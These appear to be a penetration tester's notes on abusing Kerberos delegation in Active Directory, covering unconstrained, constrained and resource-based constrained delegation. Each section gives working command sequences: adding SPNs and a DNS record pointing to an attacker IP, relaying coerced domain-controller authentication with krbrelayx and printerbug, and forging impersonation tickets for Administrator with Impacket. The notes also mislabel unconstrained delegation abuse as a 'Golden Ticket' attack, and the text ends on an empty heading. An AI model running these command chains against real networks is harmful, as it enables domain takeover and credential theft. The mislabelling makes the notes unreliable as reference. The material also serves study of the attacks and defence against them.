# Unconstrained
(https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)

>[!NOTE]
>Unconstrained delegation abuses are usually combined with an [MS-RPRN abuse (printerbug)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn), [MS-EFSR abuse (petitpotam)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr), [MS-FSRVP abuse (shadowcoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp), r [PrivExchange](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.

![[Pasted image 20250723125914.png]]

## What is it?

- The **oldest and least secure** form.
- When unconstrained delegation is enabled on a computer or service account, that service can impersonate users _to any other service_ on the network after the user authenticates to it.
- The service basically gets the userâ€™s full Kerberos Ticket Granting Ticket (TGT), allowing it to request tickets to _any_ service on behalf of that user.

## How to Abuse
- If an attacker compromises a machine or service with unconstrained delegation enabled, they can extract all usersâ€™ TGTs that authenticate to that machine.
- This lets the attacker impersonate any user in the domain (including admins), gaining **full domain control**.
- This attack is often called a **â€œGolden Ticketâ€** or **â€œKerberos delegation abuseâ€**.

## Abuses

```shell
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup attacker.DOMAIN_FQDN DomainController

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
# 4.b. or supply the right Kerberos long-term key directly
krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

# 5. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
# There should be a krbtgt ccache file in the current directory. And it can be used by
export KRB5CCNAME=`pwd`/'krbtgt.ccache'
```
# Constrained
If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user (e.g. domain admin, except users protected against delegation) in the environment to access another service the initial one can delegate to.

>[!NOTE]
>On a side note, a technique called [AnySPN or "service class modification"](https://www.thehacker.recipes/ad/movement/kerberos/ptt#modifying-the-spn) can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the `cifs/target.domain.local` SPN, the service class is `cifs`).

![[Pasted image 20250723130557.png]]
## What is it?

- Introduced to fix unconstrained delegationâ€™s problems.
- The service can only delegate a userâ€™s credentials to a _specific list_ of services (a constrained set)
- Admins configure which target services a given service can delegate to.
- More restrictive and secure than unconstrained delegation.
## How itâ€™s abused

- If an attacker compromises a service account with constrained delegation rights, they can impersonate users _but only to the services explicitly allowed_.

- If those target services are high-value (like domain controllers or admin tools), the attacker can escalate privileges.    

- Often combined with other attacks like **Kerberoasting** or **ticket extraction** on allowed services.

## Abuses

```bash
impacket-getST -spn "cifs/target" -impersonate "Administrator" "$DOMAIN"/"$USER":"$PASSWORD"
```

>[!NOTE]
>```
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable
>```
> - When attempting to exploit that technique, if the error above triggers, it means that either
> 	- the account was sensitive for delegation, or a member of the "Protected Users" group.
> 	-  or the constrained delegations are configured [without protocol transition](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition)


# Resource-based Constrained
If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object (e.g. the `GenericWrite` ACE, see [Abusing ACLs](https://www.thehacker.recipes/ad/movement/dacl/)), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

![[Pasted image 20250723132618.png]]
## What is it?

- Introduced in Windows Server 2012.
- Instead of the service owner configuring which services it can delegate to, **the resource owner controls which accounts can delegate to it.**
- This is done by setting permissions on the resource (target) object itself.
- Allows delegation to services running under accounts that are not in the same domain or forest (cross-domain delegation).
## How itâ€™s abused:

- If an attacker compromises a low-privilege account or computer, they can modify the **â€œmsDS-AllowedToActOnBehalfOfOtherIdentityâ€** attribute on a target resource (like a domain controller or critical server).

- This attribute grants the compromised account the right to impersonate any user to that resource.

- Effectively, attackers gain control over high-value systems without needing to compromise domain admins directly.

- This technique is sometimes called **â€œresource-based delegation abuseâ€** or **â€œKerberos delegation attacks via RBCD.â€**

## Abuses

### With SPN

**Step 1**: edit the target's "rbcd" attribute ([DACL abuse](https://www.thehacker.recipes/ad/movement/dacl/)) âœï¸

[Impacket](https://github.com/SecureAuthCorp/impacket/)'s [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py) script (Python) can be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.

```bash
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
```

**Step 2**: obtain a ticket (delegation operation) ðŸŽ«

Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).

>[!NOTE]
>The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). There however scenarios where the SPN can be changed ([AnySPN](https://www.thehacker.recipes/ad/movement/kerberos/ptt#modifying-the-spn)) to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.

```bash
impacket-getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
```

**Step 3**: Pass-the-ticket ðŸ›‚

Once the ticket is obtained, it can be used with [pass-the-ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt).

### Without SPN

In 2022, [Jame Forshaw](https://twitter.com/tiraniddo) demonstrated that the SPN requirement wasn't completely mandatory and RBCD could be operated without: [Exploiting RBCD using a normal user](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html). While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the [`MachineAccountQuota`](https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota) is set to 0. In this case, the first (edit the "rbcd" attribute) and last ("Pass-the-ticket") steps are the same. Only the "Obtain a ticket" step changes.

----

The technique is as follows:

1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
2. Change the user's password hash and set it to the TGT session key.
3. [Combine S4U2self and U2U](https://www.thehacker.recipes/ad/movement/kerberos/#s4u2self-+-u2u) so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
4. [Pass the ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) and access the target, as the delegated other

>[!NOTE]
>While this technique allows for an abuse of the RBCD primitive, even when the [`MachineAccountQuota`](https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota) is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account's password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.

```bash
# Obtain a TGT through overpass-the-hash to use RC4
impacket-getTGT -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'

# Obtain the TGT session key
impacket-describeTicket 'TGT.ccache' | grep 'Ticket Session Key'

# Change the controlledaccountwithoutSPN's NT hash with the TGT session key
impacket-changepasswd -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'

# Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
KRB5CCNAME='TGT.ccache' impacket-getST -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'

# The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
impacket-changepasswd -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
```
# S4U2self Abuse